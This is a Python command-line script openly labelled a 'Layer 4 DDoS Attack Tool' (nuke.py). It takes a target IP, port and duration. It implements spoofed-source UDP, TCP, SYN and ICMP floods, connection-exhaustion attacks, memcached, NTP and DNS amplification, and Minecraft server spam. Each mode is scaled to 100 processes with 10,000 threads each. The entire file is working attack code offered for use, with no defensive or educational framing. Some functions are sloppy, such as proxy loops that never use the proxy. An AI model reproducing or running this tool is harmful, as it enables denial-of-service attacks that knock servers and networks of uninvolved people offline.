# --- Developed by: Ian Narito ----
import socket
import threading
import multiprocessing
import random
import time
import sys
import os
import socks
from scapy.all import *
from scapy.layers.inet import IP, ICMP, TCP, UDP
from scapy.layers.dns import DNS, DNSQR
from colorama import Fore, Style, init
from mcstatus import JavaServer

init(autoreset=True)

MAX_THREADS = 10000
MAX_PROCESSES = 100

# --- Basic L4 Attacks ---
def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def random_port():
    return random.randint(1024, 65535)

def connect_with_socks(ip, port, proxy):
    host, proxy_port = proxy.split(":")
    sock = socks.socksocket()
    sock.set_proxy(socks.SOCKS5, host, int(proxy_port))
    sock.settimeout(3)
    sock.connect((ip, port))
    return sock

def fuzz_payload(base_payload, fuzz_factor=0.2):
    fuzzed = bytearray(base_payload)
    num_fuzz = int(len(fuzzed) * fuzz_factor)
    for _ in range(num_fuzz):
        index = random.randint(0, len(fuzzed) - 1)
        fuzzed[index] = random.randint(0, 255)
    return bytes(fuzzed)

def udp_flood(ip, port, duration):
    print("[*] Enhanced UDP flood engaged.")
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            spoofed_ip = random_ip()
            spoofed_port = random_port()
            payload_size = random.randint(600, 1400)
            headers = [
                b'\x00\x01\x00\x00\x00\x01',  
                b'\x1c\x03\x01' + os.urandom(32),  
                b'\x17\x00\x03\x2a' + b'\x00' * 4  
            ]
            payload = random.choice(headers) + os.urandom(payload_size)
            
            packet = IP(src=spoofed_ip, dst=ip) / UDP(sport=spoofed_port, dport=port) / Raw(load=payload)
            frag1 = packet.copy()
            frag2 = packet.copy()
            frag_len = int(len(payload) * 0.6)
            frag1[Raw].load = payload[:frag_len]
            frag2[Raw].load = payload[frag_len:]

            send(frag1, verbose=0)
            send(frag2, verbose=0)
        except Exception:
            continue

def tcp_flood(ip, port, duration):
    print("[*] Enhanced TCP flood engaged.")
    timeout = time.time() + duration
    flags = ['S', 'A', 'F', 'P', 'R', 'U']
    fake_headers = [
        b"GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
        b"POST /api/login HTTP/1.1\r\nHost: login.com\r\nContent-Length: 42\r\n\r\nusername=admin&password=" + os.urandom(16),
        b"\x16\x03\x01" + os.urandom(48),  
        b"USER anonymous\r\nPASS anonymous@\r\n",  
        b"EHLO example.com\r\nMAIL FROM:<user@example.com>\r\n",  
        b"\x00\x00\x10" + os.urandom(20),  
    ]
    proxies = load_proxies()
    while time.time() < timeout:
        proxy = random.choice(proxies) if proxies else None
        try:
            if proxy:
                s = connect_with_socks(ip, port, proxy)
                s.send(os.urandom(random.randint(512, 1024)))
                s.close()
            spoofed_ip = random_ip()
            sport = random_port()
            flag = random.choice(flags)
            raw_base = random.choice(fake_headers) + os.urandom(random.randint(16, 128))
            payload = fuzz_payload(raw_base, fuzz_factor=0.25)
            packet = IP(src=spoofed_ip, dst=ip, ttl=random.randint(32, 255)) / \
                     TCP(sport=sport, dport=port, flags=flag, window=random.randint(1024, 65535)) / \
                     Raw(load=payload)
            send(packet, verbose=0)
        except Exception:
            continue

def tcp_flood_proxy(ip, port, duration, proxies):
    timeout = time.time() + duration
    while time.time() < timeout:
        proxy = random.choice(proxies)
        try:
            s = connect_with_socks(ip, port, proxy)
            s.send(os.urandom(random.randint(512, 1024)))
            s.close()
        except:
            pass

def syn_flood(ip, port, duration):
    print("[*] Starting smart SYN flood...")
    timeout = time.time() + duration
    proxies = load_proxies()
    while time.time() < timeout:
        proxy = random.choice(proxies) if proxies else None
        try:
            if proxy:
                s = connect_with_socks(ip, port, proxy)
                s.send(os.urandom(random.randint(512, 1024)))
                s.close()
            spoofed_ip = random_ip()
            sport = random_port()
            ttl = random.randint(32, 255)
            window_size = random.randint(1024, 65535)
            packet = IP(src=spoofed_ip, dst=ip, ttl=ttl, flags="DF") / \
            TCP(sport=sport, dport=port, flags="S", window=window_size, options=[('MSS', 1460)])
            send(packet, verbose=0)
        except Exception as e:
            pass

def syn_flood_proxy(ip, port, duration, proxies):
    timeout = time.time() + duration
    while time.time() < timeout:
        proxy = random.choice(proxies)
        try:
            s = connect_with_socks(ip, port, proxy)
            s.send(os.urandom(random.randint(512, 1024)))
            s.close()
        except:
            pass

def icmp_flood(ip, duration):
    print("[*] Stealth ICMP flood with payload spoofing.")
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            spoofed_ip = random_ip()
            ttl = random.randint(32, 128)
            icmp_type = random.choice([0, 3, 5, 8, 11])
            code = random.randint(0, 15)
            junk = os.urandom(random.randint(64, 256))
            marker = b"AI-PING" + bytes([random.randint(65, 90)])
            payload = junk + marker + junk[::-1]

            pkt = IP(src=spoofed_ip, dst=ip, ttl=ttl) / ICMP(type=icmp_type, code=code) / payload
            send(pkt, verbose=0)
        except Exception:
            continue

# --- PROXY-BASED ---

def cps_attack(ip, port, duration, proxies):
    print("[*] Starting connection-per-second attack via proxies...")
    timeout = time.time() + duration
    while time.time() < timeout:
        for proxy in proxies:
            try:
                s = socket.socket()
                s.settimeout(1)
                s.connect((ip, port))
                s.close()
            except: pass

def connection_hold(ip, port, duration, proxies):
    print("[*] Starting connection hold attack via proxies...")
    timeout = time.time() + duration
    while time.time() < timeout:
        for proxy in proxies:
            try:
                s = socket.socket()
                s.connect((ip, port))
                time.sleep(3)
                s.close()
            except: pass


# --- Amplification Attacks ---

def memcached_amp(ip, port, duration):
    timeout = time.time() + duration
    print("[*] Starting Memcached Amplification...")
    payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
    while time.time() < timeout:
        pkt = IP(src=random_ip(), dst=ip) / UDP(sport=random.randint(1024, 65535), dport=port) / Raw(load=payload)
        send(pkt, verbose=0)

def ntp_amp(ip, port, duration):
    timeout = time.time() + duration
    print("[*] Starting NTP Amplification...")
    payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
    while time.time() < timeout:
        pkt = IP(src=random_ip(), dst=ip) / UDP(dport=port) / Raw(load=payload)
        send(pkt, verbose=0)

def dns_amp(ip, port, duration):
    timeout = time.time() + duration
    print("[*] Starting DNS Amplification...")
    while time.time() < timeout:
        pkt = IP(src=random_ip(), dst=ip) / UDP(dport=port) / DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ANY"))
        send(pkt, verbose=0)

# --- Minecraft Modes (placeholder) ---

def mcbot(ip, port, duration):
    print("[*] Starting Minecraft bot spam...")
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            fake_name = f"Bot{random.randint(1000,9999)}"
            packet = (
                b"\x00" 
                + bytes([len(fake_name)]) + fake_name.encode()
            )
            s.sendall(packet)
            s.close()
        except:
            continue

def mcstatus(ip, port, duration):
    print("[*] Spamming Minecraft Java Edition server status pings...")
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            server = JavaServer(ip, port)
            server.status()  
        except:
            continue

def mcpe_status(ip, port, duration):
    print("[*] Spamming Minecraft Bedrock Edition server status pings...")
    timeout = time.time() + duration
    message = b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(message, (ip, port))
            s.settimeout(1)
            s.recvfrom(2048)
            s.close()
        except:
            continue

# --- PROXY LOADER ---

def load_proxies(file='proxies.txt'):
    try:
        with open(file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

# --- HYBRID ENGINE ---

def run_threads(func, ip, port, duration, use_proxy):
    proxies = load_proxies() if use_proxy else []
    args = (ip, port, duration, proxies) if use_proxy else (ip, port, duration)
    
    threads = []
    for _ in range(MAX_THREADS):
        t = threading.Thread(target=func, args=args)
        t.daemon = True 
        t.start()
        threads.append(t)
    time.sleep(duration)

def hybrid_engine(func, ip, port, duration, use_proxy=False):
    processes = []
    process_args = (func, ip, port, duration, use_proxy)
    
    print(f"[*] Starting {MAX_PROCESSES} processes, each with {MAX_THREADS} threads.")
    for _ in range(MAX_PROCESSES):
        p = multiprocessing.Process(target=run_threads, args=process_args)
        p.start()
        processes.append(p)
    
    for p in processes:
        p.join()
    
    print("[*] Attack finished.")


# --- Main CLI Controller ---

def banner():
    print(Fore.RED + Style.BRIGHT + """
██╗██╗  ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗
██║██║  ██║    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝
██║███████║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  
██║╚════██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  
███████╗██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗
╚══════╝╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
      
  Layer 4 DDoS Attack Tool
""" + Style.RESET_ALL)

if __name__ == "__main__":
    banner()
    
    if len(sys.argv) < 5:
        help_banner = f"""{Fore.RED}
╔════════════════════════════════════════════════════════════════════╗
║         {Fore.YELLOW}⚠  INSUFFICIENT ARGUMENTS — READ CAREFULLY ⚠{Fore.RED}               ║
╠════════════════════════════════════════════════════════════════════╣
║  {Fore.WHITE}Usage  :{Fore.CYAN} python3 nuke.py <mode> <ip> <port> <duration>            {Fore.RED}║
║  {Fore.WHITE}Example :{Fore.CYAN} python3 nuke.py tcp 1.1.1.1 80 60                       {Fore.RED}║
║  {Fore.WHITE}Developed by  :{Fore.CYAN} IanNarito                                         {Fore.RED}║
╠════════════════════════════════════════════════════════════════════╣
║  {Fore.WHITE}Available Modes:{Fore.GREEN}                                                  {Fore.RED}║
║    ▸ tcp      ▸ udp      ▸ syn      ▸ cps                          {Fore.RED}║
║    ▸ icmp     ▸ connection ▸ mem      ▸ ntp                        {Fore.RED}║
║    ▸ dns      ▸ mcbot    ▸ minecraft  ▸ mcpe                       {Fore.RED}║
╚════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
        print(help_banner)
        sys.exit(1)
    
    mode = sys.argv[1].lower()
    ip = sys.argv[2]
    port = int(sys.argv[3])
    duration = int(sys.argv[4])
    
    mode_map = {
        "tcp": tcp_flood,
        "udp": udp_flood,
        "syn": syn_flood,
        "icmp": icmp_flood,
        "tcp_proxy": lambda i, p, d, pr: tcp_flood_proxy(i, p, d, pr),
        "syn_proxy": lambda i, p, d, pr: syn_flood_proxy(i, p, d, pr),
        "cps": lambda i, p, d, pr: cps_attack(i, p, d, pr),
        "connection": lambda i, p, d, pr: connection_hold(i, p, d, pr),
        "mem": memcached_amp,
        "ntp": ntp_amp,
        "dns": dns_amp,
        "mcbot": mcbot,
        "minecraft": mcstatus,
        "mcpe": mcpe_status,
    }

    if mode in mode_map:
        is_proxy = mode in ["cps", "connection"]
        hybrid_engine(mode_map[mode], ip, port, duration, use_proxy=is_proxy)
    else:
        print(Fore.RED + "[!] Unknown mode selected." + Style.RESET_ALL)
        sys.exit(1)
